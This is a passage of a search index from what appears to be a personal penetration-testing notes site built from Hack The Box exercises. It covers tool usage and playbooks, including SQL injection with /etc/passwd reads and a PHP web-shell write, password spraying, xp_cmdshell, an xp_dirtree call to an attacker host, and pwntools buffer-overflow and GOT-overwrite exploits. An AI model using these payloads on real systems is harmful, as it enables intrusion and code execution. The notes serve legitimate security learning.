evil-winrm -i 10.129.67.87 -u Administrator -p &lt;password&gt; If you see some SSL error while connecting to the target make sure to enable support for legacy md4 hash: Make sure the file /etc/ssl/openssl.cnf contains the following: [provider_sect] default = default_sect legacy = legacy_sect [default_sect] activate = 1 [legacy_sect] activate = 1 If you see the following error, it means the user is not authorized to use WinRM. It does not mean the user/password are incorrect. Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError ","keywords":"","version":"Next"},{"title":"curl","type":0,"sectionRef":"#","url":"/docs/tooling/curl","content":"","keywords":"","version":"Next"},{"title":"Follow redirects​","type":1,"pageTitle":"curl","url":"/docs/tooling/curl#follow-redirects","content":" └─$ curl -L &quot;http://nocturnal.htb/view.php?username=test2&amp;file=test.pdf&quot;   ","version":"Next","tagName":"h2"},{"title":"Cookies​","type":1,"pageTitle":"curl","url":"/docs/tooling/curl#cookies","content":" └─$ curl &quot;http://nocturnal.htb/view.php?username=test2&amp;file=test.pdf&quot; -b &quot;PHPSESSID=xxx&quot; -v  ","version":"Next","tagName":"h2"},{"title":"gdb","type":0,"sectionRef":"#","url":"/docs/tooling/gdb","content":"","keywords":"","version":"Next"},{"title":"gdb-peda​","type":1,"pageTitle":"gdb","url":"/docs/tooling/gdb#gdb-peda","content":" Python Exploit Development Assistance for GDB   https://github.com/longld/peda  Create a pattern of 200 chars: pattern_create 200 bof.txtCalculate the number of characters to do buffer overflow: pattern_offset &lt;EIP register&gt;Get assembler code for function: disas &lt;function&gt;. The first line shows the address you must use to jump  ","version":"Next","tagName":"h2"},{"title":"gdb-gef​","type":1,"pageTitle":"gdb","url":"/docs/tooling/gdb#gdb-gef","content":" GDB-Enhaced Features   https://github.com/hugsy/gef  vmmap: show how the memory is organized, very useful to calculate memory offsets:  gef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x00555555554000 0x00555555555000 0x00000000000000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time 0x00555555555000 0x00555555556000 0x00000000001000 r-x /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time 0x00555555556000 0x00555555557000 0x00000000002000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time 0x00555555557000 0x00555555558000 0x00000000002000 rw- /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time 0x007ffff7d90000 0x007ffff7d93000 0x00000000000000 rw- 0x007ffff7d93000 0x007ffff7dbb000 0x00000000000000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6 0x007ffff7dbb000 0x007ffff7f50000 0x00000000028000 r-x /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6 0x007ffff7f50000 0x007ffff7fa8000 0x000000001bd000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6 0x007ffff7fa8000 0x007ffff7fac000 0x00000000214000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6 0x007ffff7fac000 0x007ffff7fae000 0x00000000218000 rw- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6   spooky_time memory is between address 0x00555555554000 and 0x00555555558000libc memory is between address 0x007ffff7d93000 and 0x007ffff7fae000 ","version":"Next","tagName":"h2"},{"title":"gobuster","type":0,"sectionRef":"#","url":"/docs/tooling/gobuster","content":"gobuster https://github.com/OJ/gobuster gobuster performs dir busting on a web server. It discovers available paths using a word list. The following examples checks all the words in /usr/share/dict/american-english-small dictionary and searches for paths with php extensions and stores the results in /tmp/found and uses 20 threads: gobuster -x php -u http://&lt;ip&gt; -w /usr/share/dict/american-english-small -o /tmp/found -t 20 gobuster can also perform sub-domain enumeration (by dns records or by virtual host) e.g: gobuster vhost --url http://thetoppers.htb -w /usr/share/workdlists/subdomains-top1million-5000.txt -t 50 --append-domain Consider using different wordlist for subdomains and for directories","keywords":"","version":"Next"},{"title":"SQL Injections","type":0,"sectionRef":"#","url":"/docs/playbooks/sqli","content":"","keywords":"","version":"Next"},{"title":"Comments​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#comments","content":" When trying to make the SQL injection, remember that SQL has different comment characters: # and --. Mind the space in the last one, it's better to use -- - char for this kind of escape.  ","version":"Next","tagName":"h2"},{"title":"URL encode​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#url-encode","content":" If you are trying to discover a SQL injection and you fail, remember that you might need to use the URL-encoded characters:  Character\tURL Encoded Character'\t%27 &quot;\t%22 #\t%23 ;\t%3B )\t%29  ","version":"Next","tagName":"h2"},{"title":"Query logic​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#query-logic","content":" Remember you can subvert any query logic by using the AND and OR operators, e.g:  SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';   If you are free to input any value in admin you can ignore the AND:  SELECT * FROM logins WHERE username='admin'--' AND password = 'p@ssw0rd';   Another example, you can just not only ignore the conditions but change them:  SELECT * FROM logins WHERE ((username='admin') AND id &gt; 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e'   username = other')) OR id=5'--  SELECT * FROM logins WHERE ((username='username = other')) OR id=5'--) AND id &gt; 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e'   And you will log-in as user with ID 5  ","version":"Next","tagName":"h2"},{"title":"Union​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#union","content":" You can abuse the SQL injection to extract info from any table using the UNION clause. You just need to know the number of columns.  You can combine the outputs of two tables provided they have the same number of columns.  In order to know the number of columns, you can use the following methods:  Order by: you can pass the number of column to sort by: 1,2,3, keep trying until you got an error. That's the number of columns. Union: similar to the last one but provide the colums to a union query: UNION select 1,2,3. When it fails, you'll know the max number of columns.  This last method provides the benefit that you see in the UI if there are some hidden column.  ","version":"Next","tagName":"h2"},{"title":"Enumerating through SQL injection​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#enumerating-through-sql-injection","content":" You can extract the information in the database via SQL injection. However, first you must know the databases inside, the tables and the structure of them.  No worries, you can make use of the table metadata to obtain this information:  ","version":"Next","tagName":"h2"},{"title":"Databases​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#databases","content":" All available databases  SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;   Current database  select 1,database(),2,3-- -   ","version":"Next","tagName":"h3"},{"title":"Tables​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#tables","content":" All available tables in database dev  select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'   ","version":"Next","tagName":"h3"},{"title":"Table columns​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#table-columns","content":" All available columns in table 'credentials'  select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'   ","version":"Next","tagName":"h3"},{"title":"User privileges​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#user-privileges","content":" In certain conditions the user might be authorized to read/write files from the database. First of all you need to know the privileges of the current user:  To know the user running the database:  SELECT 1, user(), 3, 4   Check if the user is a super-user:  SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;   List all privileges of user:  SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee=&quot;'root'@'localhost'&quot;   ","version":"Next","tagName":"h2"},{"title":"Reading​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#reading","content":" If FILE privilege is granted for the user, you might be able to read any system file from the database engine:  SELECT LOAD_FILE('/etc/passwd'); SELECT 1, LOAD_FILE(&quot;/var/www/html/search.php&quot;), 3, 4   This will work provided the user running the database has read access in the OS.  You can use TO_BASE64 function for convinience:  SELECT 1, TO_BASE64(LOAD_FILE(&quot;/var/www/html/config.php&quot;)), 3, 4   And later decode it:  cat /tmp/b.txt | tr -d ' ' | base64 -d &gt; /tmp/b.php   Note that displaying the base64 added some whitespaces which base64 command dislikes. You can use tr to remove those chars.  ","version":"Next","tagName":"h3"},{"title":"Writing​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#writing","content":" There are some requirements to be able to write a file from the database:  FILE privilegeGlobal secure_file_priv variable not enabledThe user running the database must have write access to the destination  You can check the global variable with a query like:  SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;   If the conditions are met, writing to a file is simple:  select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'   Then, you can try more advanced stuff, like writing a web shell:  select &quot;&quot;,'&lt;?php system($_REQUEST[0]); ?&gt;', &quot;&quot;, &quot;&quot; into outfile '/var/www/html/shell.php'   The attacker might run this web-shell from http://SERVER_IP:PORT/shell.php?0=id ","version":"Next","tagName":"h3"},{"title":"hashcat","type":0,"sectionRef":"#","url":"/docs/tooling/hashcat","content":"hashcat Determine type of hash: hashcat exfil/hash.txt ... # | Name | Category ======+============================================================+====================================== 3200 | bcrypt $2*$, Blowfish (Unix) | Operating System 25600 | bcrypt(md5($pass)) / bcryptmd5 | Forums, CMS, E-Commerce 25800 | bcrypt(sha1($pass)) / bcryptsha1 | Forums, CMS, E-Commerce 28400 | bcrypt(sha512($pass)) / bcryptsha512 | Forums, CMS, E-Commerce -m defines the type of hash -a 0 means dictionary attack hashcat exfil/hash.txt -m 3200 -a 0 /usr/share/wordlists/rockyou.txt ","keywords":"","version":"Next"},{"title":"ftp","type":0,"sectionRef":"#","url":"/docs/tooling/ftp","content":"ftp Stands for File transfer protocol. It listens on port 21 by deault and is unencrypted (the secure version is called sftp) The first thing to try while trying to access ftp is user anonymous whitout password. Commands: ls: list directory contentspass: set passive modeget: retrieve file to computer Examples ftp &lt;ip&gt; Connected to &lt;ip&gt;. 220 (vsFTPd 3.0.3) Name (&lt;ip&gt;:gal): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; ls 500 Illegal PORT command. ftp: bind: Address already in use ftp&gt; pass Passive mode on. ftp&gt; ls 227 Entering Passive Mode (10,129,103,239,82,68). 150 Here comes the directory listing. -rw-r--r-- 1 0 0 32 Jun 04 2021 flag.txt 226 Directory send OK. ftp&gt; get flag.txt /tmp/flag.txt local: /tmp/flag.txt remote: flag.txt 227 Entering Passive Mode (10,129,103,239,159,232). 150 Opening BINARY mode data connection for flag.txt (32 bytes). 226 Transfer complete. 32 bytes received in 0.00 secs (21.1291 kB/s) in order to use the ls command, we need to set the Passive mode by issuing the pass command Download all contents of ftp-server: wget -m ftp://username:password@ip.of.old.host To see hidden files: ls -la ","keywords":"","version":"Next"},{"title":"johntheripper","type":0,"sectionRef":"#","url":"/docs/tooling/john-the-ripper","content":"johntheripper https://github.com/openwall/john Password cracking tool. It does not do anything magic, it just compares a hash file with a list of words (dictionary). It has a quite decent default dictionary, however, you can search for more complete dictionaries such as the rock-you.txt Make sure to install a version &gt;= 1.9.0, which enables support for many hash formats. In my case for 1.8.0 version I couldn't crack a NTLMv2 hash. You can also use zip2john tool to brute-force zip files with passwords. You can specify the format as well: john --format=raw-md5 passwd.txt You can determine the type of hash by running hashid and then check with: john --list=formats ","keywords":"","version":"Next"},{"title":"crackmapexec","type":0,"sectionRef":"#","url":"/docs/tooling/crackmapexec","content":"","keywords":"","version":"Next"},{"title":"Brute-force Sambda users​","type":1,"pageTitle":"crackmapexec","url":"/docs/tooling/crackmapexec#brute-force-sambda-users","content":" Will try to determine the users of a system by trying with different `rid``  crackmapexec smb 10.10.11.236 -u anonymous -p &quot;&quot; --rid-brute 10000 &gt; u.txt   Now we can delete useless users:  cat u.txt |grep -i user |rev |cut -f2 -d ' ' |rev |grep FLUFFY |cut -f2 -d '\\' |grep -Ev (DC|SVC) |tail -n +4 &gt; users.txt   ","version":"Next","tagName":"h2"},{"title":"Password spraying​","type":1,"pageTitle":"crackmapexec","url":"/docs/tooling/crackmapexec#password-spraying","content":" It will try to combine the values in the provided files to see if it returns a valid login attempt  crackmapexec smb 10.10.11.236 -u exfil/users -p exfil/users  ","version":"Next","tagName":"h2"},{"title":"ffuf","type":0,"sectionRef":"#","url":"/docs/tooling/ffuf","content":"","keywords":"","version":"Next"},{"title":"Fuzzing html pages​","type":1,"pageTitle":"ffuf","url":"/docs/tooling/ffuf#fuzzing-html-pages","content":" ffuf -w /opt/github/SecLists/Discovery/Web-Content/common.txt:FUFF -u http://devvortex.htb/FUFF.html   ","version":"Next","tagName":"h2"},{"title":"Fuzzing sub-domains​","type":1,"pageTitle":"ffuf","url":"/docs/tooling/ffuf#fuzzing-sub-domains","content":" ffuf -w /opt/github/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H &quot;Host: FUZZ.devvortex.htb&quot; -u http://devvortex.htb -fl 8   ","version":"Next","tagName":"h2"},{"title":"Fuzzing extensions​","type":1,"pageTitle":"ffuf","url":"/docs/tooling/ffuf#fuzzing-extensions","content":" ffuf -w /opt/github/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ   The wordlist has the . extension, so no need to add it to the command.  ","version":"Next","tagName":"h2"},{"title":"Fuzzing with recursion​","type":1,"pageTitle":"ffuf","url":"/docs/tooling/ffuf#fuzzing-with-recursion","content":" You can fuzz directories, sub-directories and pages by using recursion:  ffuf -w /opt/github/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.54.75:59384/FUZZ -ic -v -recursion -recursion-depth 1 -e .php   -ic ignore comments in the wordlist-v prints the whole URL-recursion enable recursive scanning-recursion-depth 1 only allow one level of recursion, otherwise the scan will take too much time-e .php set the extension to add when scanning for concrete page in directory.  ","version":"Next","tagName":"h2"},{"title":"Fuzzing paramters​","type":1,"pageTitle":"ffuf","url":"/docs/tooling/ffuf#fuzzing-paramters","content":" ffuf -w /opt/github/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:30373/admin/admin.php?FUZZ=value -fs 798   -fs 798 filter by pages returning different size of 798 bytes. This is useful to identify different page contents.  You can also fuzz POST data:  ffuf -w /opt/github/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx   If you identify a parameter, you can also fuzz the values:  ffuf -w /tmp/ids.txt:FUZZ -u http://admin.academy.htb:30373/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 768   If the parameter is a username, you can try to enumerate the users with SecList names.txt:   ffuf -w /opt/github/SecLists/Usernames/Names/names.txt:FUFF -u &quot;http://nocturnal.htb/view.php?username=FUFF&amp;file=test.pdf&quot; -H &quot;Cookie: PHPSESSID=xxx&quot; -fw 1170   In this case, the brute-force was only available for authenticated users. Luckily, we can pass cookies to fuff. It's a bit confusing as you need to set the -H flag, the same as a header, but prefix it with Cookie: . ","version":"Next","tagName":"h2"},{"title":"mongodb","type":0,"sectionRef":"#","url":"/docs/tooling/mongodb","content":"mongodb MongoDB is a document based (NoSQL) database that runs by default on port 27017. To connect to it, we should use the mongo shell, currently mongosh. To show all the database in the instance, use the show dbs command. To select a database: use &lt;db&gt; To show all the collections in a database use the show collections commands. To show contents of all the documents inside a collection use the db.&lt;collection&gt;.find().pretty(). It will pretty print the results. Example: mongosh &lt;ip&gt; Current Mongosh Log ID: 63999d00a5b1f19a65a9d84b Connecting to: mongodb://&lt;ip&gt;:27017/?directConnection=true&amp;appName=mongosh+1.6.1 Using MongoDB: 3.6.8 Using Mongosh: 1.6.1 For mongosh info see: https://docs.mongodb.com/mongodb-shell/ test&gt; show dbs admin 32.00 KiB config 72.00 KiB local 72.00 KiB sensitive_information 32.00 KiB users 32.00 KiB test&gt; show collections test&gt; use sensitive_information switched to db sensitive_information sensitive_information&gt; show collections flag sensitive_information&gt; db.flag.find().pretty() [ { _id: ObjectId(&quot;630e3dbcb82540ebbd1748c5&quot;), flag: 'flag' } ] sensitive_information&gt; ","keywords":"","version":"Next"},{"title":"netcat","type":0,"sectionRef":"#","url":"/docs/tooling/netcat","content":"netcat Listen on 1234 port: nc -lnvp 1234 -l : Listen mode -n: numeric-only IP addresses, no dns -v: verbose -p: port - we can add p to say that we want to listen on a specific port (here 1234)","keywords":"","version":"Next"},{"title":"postgres","type":0,"sectionRef":"#","url":"/docs/tooling/postgres","content":"postgres Basic commands (outisde of SQL queries): \\l list databases\\c db connect to a database named db\\dt list tables on given database","keywords":"","version":"Next"},{"title":"nmap","type":0,"sectionRef":"#","url":"/docs/tooling/nmap","content":"","keywords":"","version":"Next"},{"title":"Scan all​","type":1,"pageTitle":"nmap","url":"/docs/tooling/nmap#scan-all","content":" You can pass the -A flag which enables OS detection, version detection, script scanning, and traceroute, however that is very easy to detect by an IDS/IPS system.  nmap -A &lt;ip&gt;   ","version":"Next","tagName":"h2"},{"title":"Service version detection​","type":1,"pageTitle":"nmap","url":"/docs/tooling/nmap#service-version-detection","content":" To enable only service version detection:  nmap -sV &lt;ip&gt;   -sV flag does scanning and prints service and version on the found open port  To specify the default set of scripts for version identification use -sC  nmap -sC &lt;ip&gt;   ","version":"Next","tagName":"h2"},{"title":"Scan all ports​","type":1,"pageTitle":"nmap","url":"/docs/tooling/nmap#scan-all-ports","content":" To scan all the ports, we need to specify this flags:  namp -p- &lt;ip&gt;   Take into account that this operation will take a long time to complete.  --min-rate speeds up the process by sending packets not slower than X messages per second.  ","version":"Next","tagName":"h2"},{"title":"Firewall evasion​","type":1,"pageTitle":"nmap","url":"/docs/tooling/nmap#firewall-evasion","content":" If nmap reports he has issues because could not determine if port open or closed. The machine might be protected by a firewall, instead of performing a TCP SYN scan, you can use a TCP FIN scan by providing the flag -sF  You can disable ping scan (blocked by firewalls) by disabling host discovery: -Pn.  ","version":"Next","tagName":"h2"},{"title":"Disable DNS resolution​","type":1,"pageTitle":"nmap","url":"/docs/tooling/nmap#disable-dns-resolution","content":" You can disable DNS resolution with -n ","version":"Next","tagName":"h2"},{"title":"rsync","type":0,"sectionRef":"#","url":"/docs/tooling/rsync","content":"rsync rsync is a tool to share files between Linux machines, it defaults to SSH port (22) or 873. With rsync:// will use 873 port while the form user@host will use the SSH port To list all the rsync shares: rsync --list-only rsync://&lt;ip&gt; public Anonymous Share ","keywords":"","version":"Next"},{"title":"ms-sql","type":0,"sectionRef":"#","url":"/docs/tooling/ms-sql","content":"ms-sql Connect with impacket-mssqlclient.py: mssqlclient.py manager.htb/operator:operator@dc01.manager.htb -windows-auth Show databases SELECT name, database_id, create_date FROM sys.databases; Show tables SELECT name FROM sys.tables; Check if we have permission to run xp_* EXEC sp_helprotect 'xp_cmdshell' EXEC sp_helprotect 'xp_dirtree' Execute code EXEC xp_cmdshell whoami List files EXEC xp_dirtree '\\\\&lt;attacker_IP&gt;\\any\\thing' EXEC xp_dirtree 'C:\\inetpub\\wwwroot', 1, 1; ","keywords":"","version":"Next"},{"title":"Reversing","type":0,"sectionRef":"#","url":"/docs/playbooks/reversing","content":"","keywords":"","version":"Next"},{"title":"Buffer overflow​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#buffer-overflow","content":" In order to understand this attack, first we need to understand how the memory works in the computers.  We first need to understand that memory has the following regions:  Memory section\tDescriptionStack\tstores function local variables and information about function calls: return address, arguments, etc.. Heap\tstores the dynamic memory. Used by malloc, etc... BSS\tstores the uninitialized static/global variables Data\tstores the static/global variables Text\tread only, stores the executable code  Inside the stack, a new stack frame is created for every function execution. Inside a stack frame, we can see:  Stack frame section\tDescriptionFunction arguments Return address\twhere to go when the execution ends Previous frame pointer\tto know what is the stack frame of the function calling this function Local variables\t  Take this functions as example:  #include &lt;string.h&gt; void foo(char *str) { char buffer[12]; /* The following statement will result in buffer overflow */ strcpy(buffer, str); } int main() { char *str = &quot;This is definitely longer than 12&quot;; foo(str); return 1; }   The stack frame for foo() will look like this:  Stack frame section\tValueFunction arguments\tstr (pointer) Return address Previous frame pointer Local variables\tbuffer[11] ... buffer[1]  In this case, we can keep adding data into the buffer until we reach the memory address of the return address. Then, we can tell the program to jump to any function that we want.  Knowing that, buffer overflow technique consists in three stages:  ","version":"Next","tagName":"h2"},{"title":"Overflow the stack pointer​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#overflow-the-stack-pointer","content":" When a function does not limit the input characters, it can happen that the user inputs more bytes than the expected, e.g: gets function:  void vuln(void) { char local_bc [180]; gets(local_bc); puts(local_bc); return; }   In this case, if the user inputs 200 chars, the program will fail with segmentation fault and the data will be injected in some unknown region of the stack.  ","version":"Next","tagName":"h3"},{"title":"Reach to the return address​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#reach-to-the-return-address","content":" Knowing that the function is vulnerable to buffer overflow, we can craft a special payload that change the return address to make it jump where we want.  In order to do this, the first thing we need to do is find the offset on the input data in order to write to the return address.  Using ghidra we can find easily the value of the return function as it will be the next instruction just after the invocation to our target function, so you will need to calculate the payload using those values.  You can do it in a less manual way using gdb-peda:  Knowing that the buffer has 180 chars, let's suppose that will 200 chars will overflow it, let's create a pattern of 200 chars:  pattern_create 200 bof.txt  and input it to the program:  r &lt; pattern.txt  When the program crashes, we'll see the registers:  You know who are 0xDiablos: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0xc9 EBX: 0x76414158 ('XAAv') ECX: 0xf7fa09b4 --&gt; 0x0 EDX: 0x1 ESI: 0xffffcf94 --&gt; 0xffffd165 (&quot;/home/gal/workspace/hack-the-box/boxes/you-know-0x-diables/vuln&quot;) EDI: 0xf7ffcb80 --&gt; 0x0 EBP: 0x41594141 ('AAYA') ESP: 0xffffceb0 (&quot;ZAAxAAyA&quot;) EIP: 0x41417741 ('AwAA') EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x41417741 [------------------------------------stack-------------------------------------] 0000| 0xffffceb0 (&quot;ZAAxAAyA&quot;) 0004| 0xffffceb4 (&quot;AAyA&quot;) 0008| 0xffffceb8 --&gt; 0xf7fbeb00 --&gt; 0xf7d8fcd4 (&quot;GCC_3.0&quot;) 0012| 0xffffcebc --&gt; 0x3e8 0016| 0xffffcec0 --&gt; 0xffffcee0 --&gt; 0x1 0020| 0xffffcec4 --&gt; 0xf7f9f000 --&gt; 0x229dac 0024| 0xffffcec8 --&gt; 0xf7ffd020 --&gt; 0xf7ffda40 --&gt; 0x0 0028| 0xffffcecc --&gt; 0xf7d96519 --&gt; 0x8310c483 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x41417741 in ?? ()   The interesting one is EIP as it is the register that points to the next instruction. Note that if you change the payload, the value of the EIP pointer will change as well.  Now, we can use pattern_offset to obtain exactly the number of characters to reach to Return address:  gdb-peda$ pattern_offset 0x41417741 1094809409 found at offset: 188   Now we know that if we write exactly 188 chars, the next content will be written to the return address and we can make the program jump to where we want.  ","version":"Next","tagName":"h3"},{"title":"Write the exploit​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#write-the-exploit","content":" In the case I'm working on the exploit just need to call another function in the code. In order to so, I'll use python pwntools which helps a lot on these kind of things.  from pwn import * context.update(arch=&quot;i386&quot;, os=&quot;linux&quot;) elf = ELF(&quot;./vuln&quot;) # offset to reach right before return address's location offset = b&quot;A&quot; * 188 # craft exploit: offset + flag() + padding + parameter 1 + parameter 2 exploit = offset + p32(elf.symbols['flag'], endian=&quot;little&quot;) + p32(0x90909090) + p32(0xdeadbeef, endian=&quot;little&quot;) + p32(0xc0ded00d, endian=&quot;little&quot;) r = elf.process() r.sendlineafter(&quot;:&quot;, exploit) r.interactive()   Remember that we are jumping to flag() using RET. This means flag() will think itself have a return address. Therefore, we should pad with any 4 bytes of content before we write the 2 parameters.  ","version":"Next","tagName":"h3"},{"title":"Obfuscated code​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#obfuscated-code","content":" Sometimes, when trying to reverse the code, you might see strings that look very odd, e.g:  3734203635203636203132322036352036382034382036352037342031  This might be some string buf obfuscated somehow. So far, I found this kind of simple de-obfuscation (the plan is to keep updating this with more obfuscation techniques):  ","version":"Next","tagName":"h2"},{"title":"Hex to DEC > DEC to char > decode all string in base64​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#hex-to-dec--dec-to-char--decode-all-string-in-base64","content":" import binascii import base64 def dec_to_chr(str): return &quot;&quot;.join([chr(int(s)) for s in str.decode('utf-8').split(' ')]) base64text = &quot;&quot; base64text += dec_to_chr(binascii.unhexlify(&quot;3734203635203636203132322036352036382034382036352037342031&quot;) + binascii.unhexlify(&quot;31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033&quot;)) base64text += dec_to_chr(binascii.unhexlify(&quot;3635203631&quot;)) print(base64.b64decode(base64text).decode()) $s='77.74.   In this case, this looks like the begining of a script trying to connect to an IP address.  ","version":"Next","tagName":"h3"},{"title":"String format vulnerability​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#string-format-vulnerability","content":" Some pieces of unsecure code, will print whatever the user is coding, see:  __isoc99_scanf(&quot;%299s&quot;,local_148); printf(local_148);   If we're a malicious user, can use that piece of code to leak memory addresses from the stack simply by using string format: %p,%p,%p will leak the first three memory positions in the stack: 0x1,0x1,0x7ffff7d14a37  More info here https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/  More possible formats: https://en.wikipedia.org/wiki/Printf_format_string  ","version":"Next","tagName":"h2"},{"title":"Security flags​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#security-flags","content":" When a binary is generated, there are some flags that can be setup for security reasons, here are listed. To check it you can use checksec:  gal@gal-Modern-14-C12M:~/workspace/gal/blog$ checksec /usr/bin/ls [*] '/usr/bin/ls' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled   RELRO: If there's no RELRO protection, it means that the Global Object Table (GOT) is writtable. The GOT contains the memory address of the standard library methods. If you can override this, it means that when computer executes puts, an attack can change the table to make it execute arbitrary code.Stack: canary found, it means it hard to crash and gain code execution via buffer overflow.NX: No code execution from the stackPIE: executable is loaded at random address.  More info https://opensource.com/article/21/6/linux-checksec  ","version":"Next","tagName":"h2"},{"title":"ASLR: Address Space Layout Randomisation​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#aslr-address-space-layout-randomisation","content":" This is a technique used to avoid memory corruption attacks. In order to prevent an attacker from reliably jumping to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.  In order to check if a exploit is stable and will work even with ASLR enabled, you can enable it in gdb:  gef➤ aslr on [+] Enabling ASLR gef➤ start   ","version":"Next","tagName":"h2"},{"title":"One gadget​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#one-gadget","content":" https://github.com/david942j/one_gadget  libc library has some pieces of code that runs a piece of code similar to execve('/bin/sh', NULL, NULL) which will lead to remote code execution.  You can use the one gadget to know exactly the memory address you need to point to achive this RCE.  gal@gal-Modern-14-C12M:~/workspace/hackthebox/spooky-time/challenge$ one_gadget glibc/libc.so.6 0x50a37 posix_spawn(rsp+0x1c, &quot;/bin/sh&quot;, 0, rbp, rsp+0x60, environ) constraints: rsp &amp; 0xf == 0 rcx == NULL rbp == NULL || (u16)[rbp] == NULL 0xebcf1 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70]) constraints: address rbp-0x78 is writable [r10] == NULL || r10 == NULL [[rbp-0x70]] == NULL || [rbp-0x70] == NULL 0xebcf5 execve(&quot;/bin/sh&quot;, r10, rdx) constraints: address rbp-0x78 is writable [r10] == NULL || r10 == NULL [rdx] == NULL || rdx == NULL 0xebcf8 execve(&quot;/bin/sh&quot;, rsi, rdx) constraints: address rbp-0x78 is writable [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL   For every memory address, it also describe which value the register need to have in order to execute the RCE.  ","version":"Next","tagName":"h2"},{"title":"Overwrite Global Object Table​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#overwrite-global-object-table","content":" The global object table is used to dynamically resolve standard library functions (scanf, printf, etc...). If you can modify it, you can alias an arbitrary code as any standard library function. You can use this flaw plus the one gadge tool in the previous section to setup a Remote Code Execution.  Below, you can find an example of how we can override the global object table using the one gadget tool:  from pwn import * context.binary = elf = ELF('./spooky_time') libc = context.binary.libc r = process('./spooky_time') r.sendlineafter(b'scary!\\n\\n', '%3$lx%51$lx') r.recvuntil(b'than \\n') libc.address = int(r.recvn(12), 16) - 1133111 elf.address = int(r.recvn(12), 16) - 5056 libc_one_gadget = libc.address + 0xebcf5 # libc.address + offset computed with one gadget tool fmtstr_payload = fmtstr_payload(8, {elf.got['puts'] : libc_one_gadget}) # we make the function puts point to a RCE r.sendlineafter(b'time..\\n\\n', fmtstr_payload) r.interactive()  ","version":"Next","tagName":"h2"},{"title":"powershell","type":0,"sectionRef":"#","url":"/docs/tooling/powershell","content":"","keywords":"","version":"Next"},{"title":"Base64 encode​","type":1,"pageTitle":"powershell","url":"/docs/tooling/powershell#base64-encode","content":" [Convert]::ToBase64String((Get-Content -path 